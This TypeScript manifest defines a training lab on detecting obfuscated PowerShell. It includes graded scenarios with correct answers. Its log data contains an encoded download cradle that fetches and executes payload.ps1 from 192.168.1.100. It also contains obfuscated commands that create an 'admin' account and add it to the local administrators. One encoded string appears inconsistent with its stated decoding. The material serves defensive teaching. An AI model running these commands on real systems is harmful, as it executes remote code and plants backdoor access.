import type { LabManifest } from "../../types/manifest";

export const powershellObfuscationDetectionLab: LabManifest = {
  schemaVersion: "1.1",
  id: "powershell-obfuscation-detection",
  version: 1,
  title: "PowerShell Obfuscation Detection",

  tier: "intermediate",
  track: "detection-hunting",
  difficulty: "moderate",
  accessLevel: "free",
  tags: ["powershell", "obfuscation", "detection", "threat-hunting", "windows", "script-block-logging"],

  description:
    "Analyze PowerShell execution logs to identify obfuscated malicious commands — distinguishing encoding, string concatenation, and invoke-expression abuse from legitimate administrative scripts.",
  estimatedMinutes: 10,
  learningObjectives: [
    "Identify common PowerShell obfuscation techniques including Base64 encoding and string concatenation",
    "Analyze ScriptBlock logging output to reveal deobfuscated malicious content",
    "Distinguish malicious PowerShell obfuscation from legitimate administrative encoding",
  ],
  sortOrder: 740,

  status: "published",
  prerequisites: [],

  rendererType: "investigate-decide",

  scenarios: [
    {
      type: "investigate-decide",
      id: "ps-001",
      title: "Base64-Encoded Download Cradle",
      objective:
        "PowerShell execution was logged on WORKSTATION-14. Investigate whether the encoded command is malicious.",
      investigationData: [
        {
          id: "command-line",
          label: "Logged Command Line",
          content:
            "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQAgAHwAIABJAEUAWAA=",
          isCritical: true,
        },
        {
          id: "decoded-content",
          label: "Decoded Base64 Content",
          content:
            "$client = New-Object System.Net.WebClient;$client.DownloadString('http://192.168.1.100/payload.ps1') | IEX",
        },
        {
          id: "network-context",
          label: "Network Connection",
          content:
            "HTTP GET to 192.168.1.100/payload.ps1 at time of execution. 192.168.1.100 is not a known internal server. 14KB response received. PowerShell process spawned by: WINWORD.EXE (Microsoft Word).",
          isCritical: true,
        },
        {
          id: "parent-process",
          label: "Process Tree",
          content:
            "WINWORD.EXE (PID 4821) → powershell.exe (PID 6102) → powershell.exe (PID 6189, downloaded payload). User opened email attachment 'Invoice_March_2026.docx' 3 minutes before execution.",
          isCritical: true,
        },
      ],
      actions: [
        {
          id: "ISOLATE_INVESTIGATE_FULL_IR",
          label: "Isolate WORKSTATION-14, preserve memory, trigger IR — Word spawning PowerShell download is confirmed malware",
          color: "red",
        },
        {
          id: "BLOCK_IP",
          label: "Block 192.168.1.100 and monitor for payload execution",
          color: "orange",
        },
        {
          id: "INVESTIGATE_PAYLOAD",
          label: "Retrieve and analyze the downloaded payload before taking action",
          color: "yellow",
        },
        {
          id: "ALERT_USER",
          label: "Alert the user about the suspicious email",
          color: "blue",
        },
      ],
      correctActionId: "ISOLATE_INVESTIGATE_FULL_IR",
      rationales: [
        {
          id: "rat-confirmed-malware",
          text: "This is confirmed malware execution: Base64-encoded PowerShell with -WindowStyle Hidden spawned by WINWORD.EXE is a textbook macro-based dropper. The decoded content is a download cradle pulling a payload from an unknown internal IP via HTTP. Word spawning PowerShell is never legitimate behavior. The user opened a malicious document 3 minutes ago. Immediate isolation is required to prevent lateral movement from the downloaded payload and to preserve memory for forensic analysis of what has already executed. IR must be triggered — this is an active compromise, not a near-miss.",
        },
        {
          id: "rat-block-only",
          text: "Blocking the C2 IP after the 14KB payload has already been downloaded and executed is too late. The payload is already running.",
        },
        {
          id: "rat-investigate-first",
          text: "The payload has already been downloaded and executed. Further investigation should happen on an isolated machine — not while the host remains on the network.",
        },
        {
          id: "rat-alert-user",
          text: "Alerting the user after malicious PowerShell has already executed doesn't contain the active compromise. Isolation is the immediate priority.",
        },
      ],
      correctRationaleId: "rat-confirmed-malware",
      feedback: {
        perfect: "Correct. Word→PowerShell→download cradle→IEX is a confirmed macro dropper. Isolate immediately, preserve memory for forensics, trigger IR.",
        partial: "The payload is already executing. IP blocking and investigation need to happen on an isolated host — don't investigate an active compromise while the machine is on the network.",
        wrong: "WINWORD.EXE spawning Base64-encoded hidden PowerShell that downloads and executes a payload is unambiguous malware behavior. This requires immediate isolation and IR.",
      },
    },
    {
      type: "investigate-decide",
      id: "ps-002",
      title: "String Concatenation Obfuscation",
      objective:
        "EDR alert on unusual PowerShell string construction. Analyze whether this represents malicious obfuscation.",
      investigationData: [
        {
          id: "obfuscated-command",
          label: "PowerShell ScriptBlock Log",
          content:
            "('ne'+'t u'+'ser adm'+'in P@ssw0rd!'+' /add') | &([scriptblock]::Create($args[0])) \n ScriptBlock logging deobfuscated: net user admin P@ssw0rd! /add",
          isCritical: true,
        },
        {
          id: "followup-commands",
          label: "Subsequent Commands",
          content:
            "('ne'+'t lo'+'calgroup administ'+'rators adm'+'in /add') | &([scriptblock]::Create($args[0]))\n Deobfuscated: net localgroup administrators admin /add",
          isCritical: true,
        },
        {
          id: "execution-context",
          label: "Execution Context",
          content:
            "Process: powershell.exe (PID 7823). Parent: cmd.exe (PID 7701). Grandparent: svchost.exe (PID 892). User context: NT AUTHORITY\\SYSTEM. Host: SERVER-APP-03 (internal application server).",
        },
        {
          id: "timing-context",
          label: "Timing and Correlation",
          content:
            "Commands executed at 03:17 AM Saturday. No scheduled task or administrative session matches this time. No IT staff working at 03:17 AM per on-call schedule. Preceded by: 5 failed login attempts from IP 10.20.1.45 (unknown host) at 03:14 AM.",
          isCritical: true,
        },
      ],
      actions: [
        {
          id: "ISOLATE_RESET_INVESTIGATE",
          label: "Isolate SERVER-APP-03, reset admin account, investigate how SYSTEM execution occurred at 03:17 AM",
          color: "red",
        },
        {
          id: "DISABLE_ACCOUNT",
          label: "Disable the 'admin' account that was created",
          color: "orange",
        },
        {
          id: "REVIEW_LOGS",
          label: "Review full event logs for the past 24 hours before acting",
          color: "yellow",
        },
        {
          id: "BLOCK_SOURCE_IP",
          label: "Block 10.20.1.45 and remove the created account",
          color: "blue",
        },
      ],
      correctActionId: "ISOLATE_RESET_INVESTIGATE",
      rationales: [
        {
          id: "rat-account-creation",
          text: "String-concatenation obfuscation of 'net user admin /add' followed by 'net localgroup administrators /add' is attacker persistence — creating a hidden local admin account with obfuscated commands to evade detection. Running as SYSTEM at 03:17 AM following failed logins from an unknown host indicates code execution was achieved via initial access. The attacker now has a backdoor admin account. Required response: isolate the server (prevent lateral movement with the new admin account), reset and investigate the admin account (it exists and may already have been used), and investigate how SYSTEM-level code execution was achieved — that's the vulnerability that must be patched.",
        },
        {
          id: "rat-disable-account",
          text: "Disabling the account without isolation leaves the attacker's code execution path active. They can create another account. The root cause — SYSTEM execution capability — must be addressed.",
        },
        {
          id: "rat-review-logs",
          text: "Log review should happen in parallel with containment, not before it. The attacker has SYSTEM execution and a backdoor admin account — waiting 24 hours before acting provides time for lateral movement.",
        },
        {
          id: "rat-block-ip",
          text: "Blocking the source IP doesn't address the attacker's persistence — the admin account already exists and can be used from any IP. Isolation and account removal are the priority.",
        },
      ],
      correctRationaleId: "rat-account-creation",
      feedback: {
        perfect: "Correct. Obfuscated local admin account creation via SYSTEM-level PowerShell at 03:17 AM following failed logins is active compromise with persistence. Isolate and investigate.",
        partial: "Account removal without isolation leaves the exploit path active. Address both the persistence (account) and the root cause (SYSTEM execution capability).",
        wrong: "SYSTEM-level account creation via obfuscated commands at 03:17 AM following failed logins is a confirmed active compromise. Blocking the IP doesn't address the established persistence.",
      },
    },
    {
      type: "investigate-decide",
      id: "ps-003",
      title: "False Positive — Legitimate Encoded Administrative Script",
      objective:
        "Automated alert on Base64-encoded PowerShell on a managed endpoint. Investigate whether this is malicious.",
      investigationData: [
        {
          id: "alert-command",
          label: "Flagged Command",
          content:
            "powershell.exe -EncodedCommand WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACcASGVsbG8gV29ybGQnACkA\nDecoded: [System.Text.Encoding]::UTF8.GetBytes('Hello World')",
        },
        {
          id: "deployment-context",
          label: "Deployment Context",
          content:
            "Command executed by: SYSTEM account at 14:30 UTC. Launched by: Endpoint Management Agent (SolarWinds N-central v2023.4). This exact command hash matches 847 other endpoints that received the same deployment job in the past hour.",
          isCritical: true,
        },
        {
          id: "job-context",
          label: "IT Job Details",
          content:
            "N-central job: 'Encoding test — verify UTF8 support on managed endpoints.' Job initiated by: IT Engineer Sarah Collins. Job ticket: INC-38821. Encoding verification is part of a rollout check for a new application that uses UTF8 string processing.",
        },
        {
          id: "payload-analysis",
          label: "Decoded Payload Analysis",
          content:
            "The decoded Base64 content is: [System.Text.Encoding]::UTF8.GetBytes('Hello World'). This simply converts a string to bytes — no download, no network connection, no persistence, no privilege operations. Output is returned to the management console.",
        },
      ],
      actions: [
        {
          id: "MARK_FALSE_POSITIVE",
          label: "Mark as false positive — managed endpoint deployment from IT via RMM tool with benign payload",
          color: "green",
        },
        {
          id: "INVESTIGATE_ALL_847",
          label: "Investigate all 847 endpoints for the same command",
          color: "orange",
        },
        {
          id: "BLOCK_ENCODED_PS",
          label: "Block all Base64-encoded PowerShell organization-wide",
          color: "red",
        },
        {
          id: "QUARANTINE_ENDPOINTS",
          label: "Quarantine all 847 affected endpoints pending investigation",
          color: "yellow",
        },
      ],
      correctActionId: "MARK_FALSE_POSITIVE",
      rationales: [
        {
          id: "rat-legitimate-rmm",
          text: "This is a legitimate IT deployment job. All indicators point to benign activity: the command comes from an approved RMM tool (SolarWinds N-central), is attributed to a specific IT engineer with a ticket number, is deployed to 847 endpoints simultaneously (attack campaigns don't use legitimate management tools to run on hundreds of managed endpoints simultaneously), and the decoded payload is trivially benign (UTF8 byte conversion). Base64 encoding in RMM deployments is common — management tools often encode commands to avoid shell interpretation issues. Tune the alert to exclude this pattern for managed endpoint deployments.",
        },
        {
          id: "rat-investigate-all",
          text: "Investigating 847 endpoints for a verified deployment job from a ticketed IT engineer wastes significant security resources. Verify the root context — 847 simultaneous deployments from an RMM is the pattern, not the anomaly.",
        },
        {
          id: "rat-block-encoded",
          text: "Blocking all Base64-encoded PowerShell organization-wide would break most endpoint management tools, security scanners, and legitimate administrative automation. This would cause more disruption than the attack it's meant to prevent.",
        },
        {
          id: "rat-quarantine",
          text: "Quarantining 847 managed endpoints for a verified IT deployment job would cause a massive operational outage with no security benefit.",
        },
      ],
      correctRationaleId: "rat-legitimate-rmm",
      feedback: {
        perfect: "Good judgment. Base64 encoding is not inherently malicious — context matters. RMM-deployed, ticketed, benign payload on 847 simultaneous managed endpoints is legitimate IT operations.",
        partial: "The simultaneous deployment to 847 endpoints via an approved RMM tool with a ticket number distinguishes this from attacker behavior. Scale and attribution matter.",
        wrong: "Blocking all Base64 PowerShell or quarantining 847 managed endpoints would cause a major operational outage for a legitimate IT deployment. Always investigate context before taking broad action.",
      },
    },
  ],

  hints: [
    "PowerShell ScriptBlock logging (Event ID 4104) deobfuscates encoded and string-concatenated commands — enabling detection even when -EncodedCommand is used.",
    "Word/Excel spawning PowerShell is never legitimate — this parent process relationship is a reliable malware indicator regardless of payload content.",
    "Base64 encoding is not inherently malicious — RMM tools, CI/CD pipelines, and management automation regularly use it. Evaluate the parent process, decoded content, and execution context together.",
  ],

  scoring: {
    maxScore: 100,
    hintPenalty: 5,
    penalties: { perfect: 0, partial: 10, wrong: 20 },
    passingThresholds: { pass: 80, partial: 50 },
  },

  careerInsight:
    "PowerShell obfuscation is used in the majority of modern malware campaigns because it enables fileless execution and evades signature-based detection. Threat hunters who understand PowerShell logging and deobfuscation are among the most effective at detecting advanced attacks.",
  toolRelevance: [
    "PowerShell Script Block Logging (Event ID 4104)",
    "CyberChef (Base64 decoding)",
    "AMSI (Antimalware Scan Interface)",
    "Sysmon (process creation logging)",
  ],

  createdAt: "2026-03-27",
  updatedAt: "2026-03-27",
};
